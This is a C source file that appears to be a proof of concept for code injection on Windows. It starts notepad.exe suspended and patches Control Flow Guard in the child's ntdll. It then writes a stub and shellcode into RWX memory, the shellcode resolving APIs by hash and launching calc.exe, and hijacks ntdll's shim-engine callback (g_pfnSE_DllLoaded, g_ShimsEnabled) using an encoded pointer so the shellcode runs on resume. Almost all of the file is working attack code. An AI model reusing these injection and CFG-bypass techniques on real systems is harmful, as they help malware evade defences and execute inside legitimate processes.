#include <Windows.h>
#include <stdio.h>
#include "Includes/Types.h"
#include "Includes/SafeRuntime.h"
#include "Includes/hde64.h"
#include "./defs.h"

ULONG_PTR find_pfnSE_address(ULONG_PTR mrdata_base);
ULONG_PTR find_ShimsEnabled_address(ULONG_PTR mrdata_base);
ULONG_PTR GetSectionBase(ULONG_PTR base_address, const char* name);
DWORD64 pow(DWORD64 x, int y);
void stub(DWORD64 addr, char* result);
LPVOID encode_system_ptr(LPVOID ptr);
PVOID getPattern(char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size);
int patchCFG(HANDLE hProcess);

typedef NTSTATUS(WINAPI* t_NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect,
	PULONG OldProtect);

unsigned char hexData[] = {
	0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x30, 0x48, 0x8B, 0x70, 0x10, 0x48, 0x8B, 0x58, 0x40,
	0x48, 0x8B, 0x00, 0x81, 0x7B, 0x0C, 0x33, 0x00, 0x32, 0x00, 0x75, 0xEC, 0x48, 0x8B, 0xCE, 0x48,
	0xC7, 0xC2, 0x32, 0x74, 0x91, 0x0C, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF0, 0x48, 0xC7,
	0xC3, 0x6C, 0x6C, 0x00, 0x00, 0x53, 0x48, 0xBB, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64,
	0x53, 0x48, 0x8B, 0xCC, 0x48, 0x83, 0xEC, 0x18, 0x41, 0xFF, 0xD6, 0x48, 0x8B, 0xD8, 0x48, 0x8B,
	0xCB, 0x48, 0xC7, 0xC2, 0x6A, 0x0A, 0x38, 0x1E, 0xE8, 0x8E, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF0,
	0x4D, 0x33, 0xC9, 0x4D, 0x33, 0xC0, 0x48, 0x33, 0xD2, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD6, 0x48,
	0x8B, 0xCE, 0x48, 0xC7, 0xC2, 0x51, 0x2F, 0xA2, 0x01, 0xE8, 0x6D, 0x00, 0x00, 0x00, 0x4C, 0x8B,
	0xF0, 0x48, 0x33, 0xC0, 0x50, 0x48, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x50,
	0x48, 0x8B, 0xCC, 0x48, 0x83, 0xEC, 0x20, 0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00, 0x41, 0xFF,
	0xD6, 0x48, 0x8B, 0xCE, 0x48, 0xBA, 0x85, 0xDF, 0xAF, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x38,
	0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF0, 0x48, 0xC7, 0xC0, 0x61, 0x64, 0x00, 0x00, 0x50, 0x48, 0xB8,
	0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x50, 0x48, 0x8B, 0xCE, 0x48, 0x8B, 0xD4, 0x48,
	0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6, 0x4C, 0x8B, 0xF0, 0x48, 0x81, 0xC4, 0x88, 0x01, 0x00, 0x00,
	0x48, 0x83, 0xEC, 0x18, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD6, 0xC3, 0x48, 0x83, 0xEC, 0x40, 0x56,
	0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0x73, 0x3C, 0x48, 0x8B, 0xC6, 0x48, 0xC1, 0xE0,
	0x36, 0x48, 0xC1, 0xE8, 0x36, 0x48, 0x8B, 0xB4, 0x03, 0x88, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE6,
	0x20, 0x48, 0xC1, 0xEE, 0x20, 0x48, 0x03, 0xF3, 0x56, 0x8B, 0x76, 0x20, 0x48, 0x03, 0xF3, 0x48,
	0x33, 0xC9, 0xFF, 0xC9, 0xFF, 0xC1, 0xAD, 0x48, 0x03, 0xC3, 0x33, 0xD2, 0x80, 0x38, 0x00, 0x74,
	0x0F, 0xC1, 0xCA, 0x07, 0x51, 0x0F, 0xBE, 0x08, 0x03, 0xD1, 0x59, 0x48, 0xFF, 0xC0, 0xEB, 0xEC,
	0x3B, 0xD7, 0x75, 0xE0, 0x5E, 0x8B, 0x56, 0x24, 0x48, 0x03, 0xD3, 0x0F, 0xBF, 0x0C, 0x4A, 0x8B,
	0x56, 0x1C, 0x48, 0x03, 0xD3, 0x8B, 0x04, 0x8A, 0x48, 0x03, 0xC3, 0x5E, 0x48, 0x83, 0xC4, 0x40,
	0xC3
};

unsigned char stub_opcodes[] = {
	0x57, 0x56, 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00,
	0x00, 0x48, 0xbe, 0xa8, 0x07, 0x5c, 0xe4, 0xf9,
	0x7f, 0x00, 0x00, 0x48, 0x89, 0x3e, 0x5f, 0x5e,
	0x90, 0x48, 0xb9, 0xa8, 0x07, 0x5c, 0xe4, 0xf9,
	0x7f, 0x00, 0x00, 0x48, 0xba, 0xa8, 0x07, 0x5c,
	0xe4, 0xf9, 0x7f, 0x00, 0x00, 0x48, 0xb8, 0xa8,
	0x07, 0x5c, 0xe4, 0xf9, 0x7f, 0x00, 0x00, 0xff,
	0xe0,
};

void stub_1(DWORD64 addr) {
	for (int i = 0; i < 8; i++) {
		stub_opcodes[11 + i] = (addr & (0x00000000000000FF * pow(0x100,i))) >> (0x8 * i);
	}
}
void stub_2(DWORD64 addr) {
	for (int i = 0; i < 8; i++) {
		stub_opcodes[27 + i] = (addr & (0x00000000000000FF * pow(0x100, i))) >> (0x8 * i);
	}
}
void stub_3(DWORD64 addr) {
	for (int i = 0; i < 8; i++) {
		stub_opcodes[37 + i] = (addr & (0x00000000000000FF * pow(0x100, i))) >> (0x8 * i);
	}
}
void stub_4(DWORD64 addr) {
	for (int i = 0; i < 8; i++) {
		stub_opcodes[47 + i] = (addr & (0x00000000000000FF * pow(0x100, i))) >> (0x8 * i);
	}
}

DWORD64 pow(DWORD64 x,int y) {
	DWORD64 result=1;
	for (int i = 0; i < y;i++) {
		result = result * x;
	}
	if (y == 0) {
		return 1;
	}
	return result;
}

LPVOID encode_system_ptr(LPVOID ptr) {
	// get pointer cookie from SharedUserData!Cookie (0x330)
	ULONG cookie = *(ULONG*)0x7FFE0330;

	return (LPVOID)__ROL8__(((DWORD64)ptr ^ cookie), 64 - (cookie & 0x3F));

	// encrypt our pointer so it'll work when written to ntdll
	//return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}
t_NtProtectVirtualMemory Pn_NtProtectVirtualMemory;

int main() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	char* file_path = "C:\\Windows\\System32\\notepad.exe";
	char abc = 0x1;
	int stub_opcodes_len = sizeof(stub_opcodes);

	FARPROC fpAddresses[] = {
		GetProcAddress(ntdll, "NtQueueApcThread"),
	};

	Pn_NtProtectVirtualMemory = (t_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");

	//for (int i = 0; i < 10; i ++ ) {
	//	printf("%d\n", pow(10, i));
	//}
	//return 0;


	ULONG_PTR pfnSE_address = find_pfnSE_address(GetSectionBase((ULONG_PTR)ntdll, ".mrdata"));
	if (!pfnSE_address) {
		printf("failed to find address of ntdll!g_pfnSE_DllLoaded\n");
		return -1;
	}
	printf("0x%llx\n", pfnSE_address);
	//system("pause");
	ULONG_PTR ShimsEnabled_address = find_ShimsEnabled_address(GetSectionBase((ULONG_PTR)ntdll, ".data"));
	if (!ShimsEnabled_address) {
		printf("failed to find address of ntdll!g_ShimsEnabled\n");
		return -1;
	}
	printf("0x%llx\n", ShimsEnabled_address);

	// start a second copy of or process in a suspended state so we can set up our callback safely
	if (!CreateProcessA(NULL, file_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("C() failed, error: %d\n", GetLastError());
	}

	patchCFG(pi.hProcess);

	LPVOID stub_addr = VirtualAllocEx(pi.hProcess, 0, sizeof(stub_opcodes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID payload_addr = VirtualAllocEx(pi.hProcess, 0, sizeof(hexData), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	HANDLE handle = (HANDLE)-2LL;

	stub_1((DWORD64)ShimsEnabled_address);
	stub_2((DWORD64)handle);
	stub_3((DWORD64)payload_addr);
	stub_4((DWORD64)fpAddresses[0]);

	if (!WriteProcessMemory(pi.hProcess, stub_addr, stub_opcodes, sizeof(stub_opcodes), NULL)) {
		printf("Write 0 failed, error: %d\n", GetLastError());
	}

	// overwrite the g_ptr_table in the child process with the already initialized one
	if (!WriteProcessMemory(pi.hProcess, payload_addr, hexData, sizeof(hexData), NULL)) {
		printf("Write 1 failed, error: %d\n", GetLastError());
	}

	printf("before target_addr : 0x%llx\n", stub_addr);

	stub_addr = encode_system_ptr(stub_addr);

	printf("after target_addr : 0x%llx\n", stub_addr);

	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pfnSE_address, &stub_addr, sizeof(pfnSE_address), NULL)) {
		printf("Write 2 failed, error: %d\n", GetLastError());
	}

	if (!WriteProcessMemory(pi.hProcess, (LPVOID)ShimsEnabled_address, &abc, 1, NULL)) {
		printf("Write 3 failed, error: %d\n", GetLastError());
	}
	//TerminateProcess(pi.hProcess, 0);
	ResumeThread(pi.hThread);
	
	//NtQueueApcThread(handle, );

	return 0;
}

ULONG_PTR find_ShimsEnabled_address(ULONG_PTR mrdata_base) {
	ULONG_PTR address_ptr = mrdata_base + 0x7194;

	return address_ptr;
}

ULONG_PTR find_pfnSE_address(ULONG_PTR mrdata_base) {
	ULONG_PTR address_ptr = mrdata_base + 0x280;
	ULONG_PTR ldrp_mrdata_base = NULL;

	// LdrpMrdataBase contains the .mrdata section base address and is located directly before AvrfpAPILookupCallbackRoutine
	for (int i = 0; i < 10; i++) {
		if (*(ULONG_PTR*)address_ptr == mrdata_base) {
			printf("found ntdll!LdrpMrdataBase at 0x%llx\n", address_ptr);
			ldrp_mrdata_base = address_ptr;
			break;
		}
		address_ptr += sizeof(LPVOID);  // skip to the next pointer
	}

	if (!ldrp_mrdata_base) {
		printf("failed to find ntdll!LdrpMrdataBase");
		return NULL;
	}

	address_ptr = ldrp_mrdata_base;

	//// AvrfpAPILookupCallbackRoutine should be the first NULL pointer after LdrpMrdataBase
	//for (int i = 0; i < 10; i--) {
	//	if (*(ULONG_PTR*)address_ptr == NULL) {
	//		printf("%d\n", i);
	//		printf("found ntdll!AvrfpAPILookupCallbackRoutine at 0x%llx\n", address_ptr);
	//		return address_ptr;
	//	}
	//	address_ptr += sizeof(LPVOID);  // skip to the next pointer
	//}

	return address_ptr - 0x28;
}

// get the base address of a PE section (used to find .mrdata in ntdll)
ULONG_PTR GetSectionBase(ULONG_PTR base_address, const char* name) {
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_headers;
	IMAGE_SECTION_HEADER* section_header;

	dos_header = (IMAGE_DOS_HEADER*)base_address;
	nt_headers = (IMAGE_NT_HEADERS*)((ULONG_PTR)dos_header + dos_header->e_lfanew);
	section_header = (IMAGE_SECTION_HEADER*)((ULONG_PTR)nt_headers + sizeof(IMAGE_NT_HEADERS));

	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE || nt_headers->Signature != IMAGE_NT_SIGNATURE) {
		printf("GetSectionBase() failed, invalid header\n");
		return NULL;
	}

	for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
		if (SafeRuntime::memcmp(name, section_header[i].Name, SafeRuntime::strlen(name)) == 0) {
			return base_address + section_header[i].VirtualAddress;
		}
	}

	printf("GetSectionBase() failed, section not found\n");
	return NULL;
}
int patchCFG(HANDLE hProcess)
{
	int res = 0;
	NTSTATUS status = 0x0;
	DWORD oldProtect = 0;
	PVOID pLdrpDispatchUserCallTarget = NULL;
	PVOID pRtlRetrieveNtUserPfn = NULL;
	PVOID check_address = NULL;
	SIZE_T size = 4;
	SIZE_T bytesWritten = 0;

	// stc ; nop ; nop ; nop
	char patch_bytes[] = { 0xf9, 0x90, 0x90, 0x90 };

	// get ntdll!LdrpDispatchUserCallTarget
	// pLdrpDispatchUserCallTarget = GetProcAddress(GetModuleHandleA("ntdll"), "LdrpDispatchUserCallTarget");
	// ntdll!LdrpDispatchUserCallTarget cannot be retrieved using GetProcAddress()
	// we search it near ntdll!RtlRetrieveNtUserPfn 
	// on Windows 10 1909  ntdll!RtlRetrieveNtUserPfn + 0x4f0 = ntdll!LdrpDispatchUserCallTarget
	pRtlRetrieveNtUserPfn = GetProcAddress(GetModuleHandleA("ntdll"), "RtlRetrieveNtUserPfn");;

	if (pRtlRetrieveNtUserPfn == NULL)
	{
		printf("RtlRetrieveNtUserPfn not found!\n");
		return -1;
	}

	printf("RtlRetrieveNtUserPfn @ 0x%p\n", pRtlRetrieveNtUserPfn);
	printf("Searching ntdll!LdrpDispatchUserCallTarget\n");
	// search pattern to find ntdll!LdrpDispatchUserCallTarget
	char pattern[] = { 0x4C ,0x8B ,0x1D ,0xE9 ,0xD7 ,0x0E ,0x00 ,0x4C ,0x8B ,0xD0 };

	// Windows 10 1909
	//pRtlRetrieveNtUserPfn = (char*)pRtlRetrieveNtUserPfn + 0x4f0;

	// 0xfff should be enough to find the pattern
	pLdrpDispatchUserCallTarget = getPattern(pattern, sizeof(pattern), 0, pRtlRetrieveNtUserPfn, 0xfff);

	if (pLdrpDispatchUserCallTarget == NULL)
	{
		printf("LdrpDispatchUserCallTarget not found!\n");
		return -1;
	}

	printf("Searching instructions to patch...\n");

	// we want to overwrite the instruction `bt r11, r10`
	char instr_to_patch[] = { 0x4D, 0x0F, 0xA3, 0xD3 };

	// offset of the instruction is  0x1d (29)
	//check_address = (BYTE*)pLdrpDispatchUserCallTarget + 0x1d;

	// Use getPattern to  find the right instruction
	check_address = getPattern(instr_to_patch, sizeof(instr_to_patch), 0, pLdrpDispatchUserCallTarget, 0xfff);

	printf("Setting 0x%p to RW\n", check_address);

	PVOID text = check_address;
	SIZE_T text_size = sizeof(patch_bytes);

	// set RW
	// NB: this might crash the process in case a thread tries to execute those instructions while it is RW
	status = Pn_NtProtectVirtualMemory(hProcess, &text, &text_size, PAGE_READWRITE, &oldProtect);

	if (status != 0x00)
	{
		//printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	// PATCH
	WriteProcessMemory(hProcess, check_address, patch_bytes, size, &bytesWritten);
	//memcpy(check_address, patch_bytes, size);

	if (bytesWritten != size)
	{
		//printf("Error in WriteProcessMemory!\n");
		return -1;
	}

	// restore
	status = Pn_NtProtectVirtualMemory(hProcess, &text, &text_size, oldProtect, &oldProtect);
	if (status != 0x00)
	{
		printf("Error in NtProtectVirtualMemory : 0x%x", status);
		return -1;
	}

	printf("Memory restored to RX\n");
	printf("CFG Patched!\n");
	printf("Written %d bytes @ 0x%p\n", bytesWritten, check_address);

	return 0;
}
PVOID getPattern(char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}